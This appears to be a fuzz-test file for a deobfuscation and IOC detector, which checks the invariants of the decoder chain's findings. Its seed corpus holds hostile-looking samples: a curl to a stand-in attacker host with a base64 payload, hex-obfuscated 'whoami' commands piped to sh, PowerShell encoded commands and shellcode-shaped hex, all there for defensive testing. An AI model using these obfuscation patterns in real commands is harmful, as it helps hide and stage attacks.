'use strict';
// ════════════════════════════════════════════════════════════════════════════
// targets/text/encoded-decoder-chain.fuzz.js
//
// Fuzz the FULL EncodedContentDetector decoder chain — the
// `_DETECTOR_FILES` mixin pile in scripts/build.py loaded together,
// driven through the public async `scan(textContent, rawBytes, ctx)`
// entry point. This is the orchestration layer that dispatches each
// candidate to the right decoder mixin via `_processCandidate`, and
// it's where most of the historical encoded-recursion regressions
// landed:
//
//   • 6a83848 — recursively stamp chain prefix on innerFindings subtree
//   • 17d1a72 — UTF-16LE PowerShell unwrap unblocked
//   • 0f71338 — per-finder budget + tightened backtick/rot13 patterns
//   • 9107360 — JS string-array obfuscator resolver; loads after cmd
//   • 6a71ee7 — _patternIocs split (CMD `for /f` non-attachment to bash)
//
// The existing `text/encoded-content` target covers the regex finders
// and three byte decoders (base64/hex/base32) in isolation. This
// target is complementary: it loads every mixin and exercises
// `_processCandidate`, which is where finder output meets decoder
// dispatch — the fan-out point that has the most uncovered branches
// per the new --coverage table.
//
// Invariants:
//   1. scan() returns a Promise that resolves to an Array. Never
//      throws past the parser-limit / aggregate-budget whitelist.
//   2. Each finding has shape:
//        { type, severity, raw, decoded?, innerFindings? }
//      with severity ∈ {critical, high, medium, low}.
//   3. innerFindings (if present) is an array; recursion depth bounded
//      by PARSER_LIMITS.MAX_DEPTH.
//   4. iocs (if present) every entry has type ∈ IOC.* — the canonical
//      enum invariant pinned by 1fadc6b.
//
// Why scan() not the per-finder methods:
//   The finders alone don't exercise the decoder dispatch. A regex
//   regression in `_processCandidate` (mismatched candidate type
//   names, missing decoder branch, infinite recursion through an
//   inner finding) is invisible to a finder-only target.
// ════════════════════════════════════════════════════════════════════════════

const { defineFuzzTarget } = require('../../helpers/harness.js');
const { syntheticTextSeeds } = require('../../helpers/seed-corpus.js');

// Mirror `_DETECTOR_FILES` from scripts/build.py exactly. Order is
// load-bearing: each mixin's prototype Object.assign must execute
// after its dependencies. Reordering breaks `_processCommandObfuscation`
// dispatch among other things — see 9107360 for the JS string-array
// resolver load-order constraint.
const DETECTOR_FILES = [
  'src/encoded-content-detector.js',
  'src/decoders/safelinks.js',
  'src/decoders/whitelist.js',
  'src/decoders/entropy.js',
  'src/decoders/xor-bruteforce.js',
  'src/decoders/ioc-extract.js',
  'src/decoders/base64-hex.js',
  'src/decoders/zlib.js',
  'src/decoders/encoding-finders.js',
  'src/decoders/encoding-decoders.js',
  'src/decoders/cmd-obfuscation.js',
  'src/decoders/ps-mini-evaluator.js',
  'src/decoders/js-assembly.js',
  'src/decoders/bash-obfuscation.js',
  'src/decoders/python-obfuscation.js',
  'src/decoders/php-obfuscation.js',
  'src/decoders/interleaved-separator.js',
];

const td = new TextDecoder('utf-8', { fatal: false });

// IOC enum pinning. We capture this once after first ctx load so the
// invariant can compare without re-reading every iteration.
let _IOC_VALUES = null;
function ensureIocValues(ctx) {
  if (_IOC_VALUES === null) {
    if (!ctx.IOC) throw new Error('harness: IOC enum not exposed');
    _IOC_VALUES = new Set(Object.values(ctx.IOC));
  }
  return _IOC_VALUES;
}

// Recursion-aware finding-shape walker. Asserts the canonical shape
// across the entire innerFindings subtree (the surface that 6a83848
// fixed to recursively stamp chain prefixes).
function checkFinding(f, ctx, depth) {
  if (depth > 16) {
    throw new Error(`invariant: innerFindings recursion exceeded MAX_DEPTH (got ${depth})`);
  }
  if (!f || typeof f !== 'object') {
    throw new Error(`invariant: finding entry not object (got ${typeof f})`);
  }
  if (typeof f.type !== 'string' || f.type.length === 0) {
    throw new Error(`invariant: finding.type ${JSON.stringify(f.type)}`);
  }
  if (f.severity !== undefined) {
    const SEV = new Set(['critical', 'high', 'medium', 'low', 'info']);
    if (!SEV.has(f.severity)) {
      throw new Error(`invariant: finding.severity ${JSON.stringify(f.severity)} outside canonical tier set`);
    }
  }
  if (Array.isArray(f.iocs)) {
    const iocValues = ensureIocValues(ctx);
    for (const ioc of f.iocs) {
      if (!ioc || typeof ioc !== 'object') {
        throw new Error('invariant: ioc entry not object');
      }
      if (typeof ioc.type !== 'string') {
        throw new Error(`invariant: ioc.type ${typeof ioc.type}`);
      }
      if (!iocValues.has(ioc.type)) {
        throw new Error(`invariant: ioc.type ${JSON.stringify(ioc.type)} not in IOC.* enum (1fadc6b)`);
      }
    }
  }
  if (Array.isArray(f.innerFindings)) {
    for (const inner of f.innerFindings) {
      checkFinding(inner, ctx, depth + 1);
    }
  }
}

const fuzz = defineFuzzTarget({
  modules: ['src/constants.js', ...DETECTOR_FILES],
  expose: [
    'IOC',
    'EncodedContentDetector',
    'PARSER_LIMITS',
  ],
  // 64 KiB is well below FINDER_MAX_INPUT_BYTES (4 MiB) and keeps
  // iteration cost bounded — the recursive scan exercises every
  // decoder mixin per iteration, which dwarfs the regex-finder work
  // the lighter `text/encoded-content` target measures.
  maxBytes: 64 * 1024,
  // FINDER_BUDGET_MS = 2_500 is the production cumulative wall-clock
  // for the whole recursion tree. We give the harness 5 s so a budgeted
  // run that legitimately uses the full 2.5 s inner budget plus
  // dispatch overhead doesn't get flagged as a ReDoS regression.
  perIterBudgetMs: 5_000,

  // The detector intentionally throws when the cumulative budget
  // expires inside `_finderBudget`. Treat that as expected.
  isExpectedError(err) {
    if (!err || typeof err.message !== 'string') return false;
    return err.message.startsWith('parser-limit:')
        || err.message.startsWith('aggregate-budget:')
        || err.message.startsWith('finder-budget:');
  },

  async onIteration(ctx, data) {
    const { EncodedContentDetector } = ctx;
    if (!EncodedContentDetector) {
      throw new Error('harness: EncodedContentDetector not exposed');
    }
    const text = td.decode(data);
    if (text.length === 0) return;

    const det = new EncodedContentDetector();
    // scan(textContent, rawBytes, context). rawBytes is the original
    // buffer used by zlib + xor-bruteforce branches when a candidate
    // looks like it offsets into binary. context = {} matches the
    // production initial-scan call from app-load.js.
    const findings = await det.scan(text, data, {});

    // Invariant 1: shape.
    if (!Array.isArray(findings)) {
      throw new Error(`invariant: scan returned ${typeof findings}, expected array`);
    }

    // Invariants 2-4: walk the recursive subtree.
    for (const f of findings) {
      checkFinding(f, ctx, 0);
    }
  },
});

// Seeds: the existing text/encoded-content seed shape (URLs, safelinks,
// etc.) PLUS hand-rolled multi-stage encoded payloads that exercise the
// recursion fan-out:
//   • UTF-16LE PowerShell EncodedCommand (17d1a72)
//   • base64 of hex of rot13
//   • JS string-array obfuscator output (9107360)
//   • CMD `for /f` deobfuscation (6a71ee7)
//   • bash $'…' ANSI-C quoting + printf '\xNN' chains
const seeds = [
  // Trivial baselines
  Buffer.from('hello world', 'utf8'),
  Buffer.from('https://example.com/?id=123', 'utf8'),

  // Base64 (single layer)
  Buffer.from('echo SGVsbG8gV29ybGQh | base64 -d', 'utf8'),

  // PowerShell EncodedCommand (UTF-16LE roundtrip)
  Buffer.from(
    'powershell -ec '
    + Buffer.from('Write-Host hello', 'utf16le').toString('base64'),
    'utf8',
  ),

  // CMD `for /f` deobfuscation shape (6a71ee7)
  Buffer.from(
    'cmd /c "for /f %X in (\'echo whoami\') do call %X"',
    'utf8',
  ),

  // Bash $'…' ANSI-C quoting (cross-shell vocabulary)
  Buffer.from(
    "sh -c $'\\x77\\x68\\x6f\\x61\\x6d\\x69'",
    'utf8',
  ),

  // Printf hex chain
  Buffer.from(
    "printf '\\x77\\x68\\x6f\\x61\\x6d\\x69' | sh",
    'utf8',
  ),

  // Long base64 + URL combo (drives both finders + IOC pushing through
  // src/decoders/ioc-extract.js)
  Buffer.from(
    'curl https://attacker.example.com/'
    + Buffer.from('payload-' + 'A'.repeat(100), 'utf8').toString('base64'),
    'utf8',
  ),

  // Hex-encoded shellcode-shaped bytes (must not hang, must be classified)
  Buffer.from('shellcode = "' + 'DEADBEEF'.repeat(32) + '"', 'utf8'),

  // Interleaved separator (NUL-injected)
  Buffer.from('$\x00W\x00C\x00=\x00v\x00a\x00l\x00', 'binary'),

  // Synthetic mix
  ...syntheticTextSeeds(8),
];

module.exports = { fuzz, seeds, name: 'encoded-decoder-chain' };
